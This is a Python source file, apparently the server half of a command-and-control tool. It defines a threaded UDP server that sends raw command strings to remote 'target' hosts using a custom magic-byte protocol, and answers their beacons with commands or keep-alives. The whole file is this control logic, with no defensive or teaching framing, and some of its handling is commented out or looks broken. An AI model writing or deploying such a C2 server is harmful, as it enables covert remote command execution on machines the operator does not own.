import queue
import socket
from queue import Queue
from threading import Thread

MAGIC_BYTES = b'\x42\x50\x3c\x33'
REQUEST_BYTE = b'\x01'
RAW_COMMAND_BYTE = b'\x02'
RESPONSE_BYTE = b'\x03'
KEEP_ALIVE_BYTE = b'\x04'
RAW_COMMAND = MAGIC_BYTES + b'\x02\x01'


class BPServer(Thread):
    def __init__(self, local_udp_port, remote_udp_port, rooms, lock):
        """
        Create a new udp server
        """
        Thread.__init__(self)
        self.rooms = rooms
        self.lock = lock
        self.is_listening = True
        self.udp_port = local_udp_port
        self.remote_port = remote_udp_port
        self.execution_queue = Queue()
        self.push_queue = Queue()

    def add_to_execution(self, task):
        self.execution_queue.put(task)

    def add_to_push(self, task):
        self.push_queue.put(task)

    def run(self):
        """
        Start udp server
        """
        self.sock = socket.socket(socket.AF_INET,
                                  socket.SOCK_DGRAM)
        self.sock.bind(("0.0.0.0", self.udp_port))
        self.sock.setblocking(0)
        self.sock.settimeout(.1)
        while self.is_listening:
            try:
                data, address = self.sock.recvfrom(1024)
            except socket.timeout:
                try:
                    push_stage = self.push_queue.get_nowait()
                except queue.Empty:
                    continue
                for target in push_stage:
                    target_address = bytes(map(int, target.split('.')))
                    for cmd in push_stage[target]:
                        cmd = bytes(cmd, 'utf-8')
                        length = len(cmd).to_bytes(2, byteorder='big')
                        packet = MAGIC_BYTES + RAW_COMMAND_BYTE + b'\x01' + b'\x00\x00\x00\x00' + target_address + length + cmd
                        self.sock.sendto(packet, (target, self.remote_port))
            except:
                continue
            target_cmds = {}
            cur_target = address[0]
            target_address = bytes(map(int, cur_target.split('.')))
            cmd_num = data[6:10]
            if MAGIC_BYTES in data[0:4] and REQUEST_BYTE == data[4:5]:
                try:
                    for cmd in target_cmds[cur_target]:
                        cmd = bytes(cmd, 'utf-8')
                        length = len(cmd).to_bytes(2, byteorder='big')
                        packet = MAGIC_BYTES + RAW_COMMAND_BYTE + b'\x01' + cmd_num + target_address + length + cmd
                        self.sock.sendto(packet, address)
                    # target_cmds.pop(cur_target)
                except KeyError:
                    packet = MAGIC_BYTES + KEEP_ALIVE_BYTE + b'\x01' + cmd_num + target_address
                    self.sock.sendto(packet, address)
            elif MAGIC_BYTES in data[0:4] and RESPONSE_BYTE == data[4:5]:
                response_len = int.from_bytes(data[13:15], byteorder='big')
                response = data[15:15 + response_len].decode('utf-8')
                # target_responses[cur_target].append(response)
                # pipe.send(target_responses)

            self.lock.acquire()
            try:
                self.rooms.send(f'Target {address[0]}')
            except Exception as e:
                print(e)
            finally:
                self.lock.release()
        self.stop()

    def stop(self):
        """
        Stop server
        """
        self.sock.close()
